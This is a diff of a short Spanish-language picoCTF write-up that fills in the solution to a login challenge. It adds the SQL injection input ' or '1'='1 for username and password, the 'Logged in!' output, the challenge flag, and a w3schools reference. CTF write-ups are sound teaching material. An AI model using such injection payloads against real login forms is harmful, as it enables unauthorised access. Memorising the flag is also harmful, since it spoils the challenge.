@@ -10,12 +10,17 @@ Try to think about how the website verifies your login.
 
 ```bash
 
+# Inyeccion sql
+
+user: ' or '1'='1`  password: ' or '1'='1
+
+# Logged in!
+
+Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
 ```
 
 # Bandera
-picoCTF{}
-# Comentarios
-|cmd| desc|
-|-----|------|
+picoCTF{s0m3_SQL_f8adf3fb}
 
 # Referencias
+https://www.w3schools.com/sql/sql_injection.asp
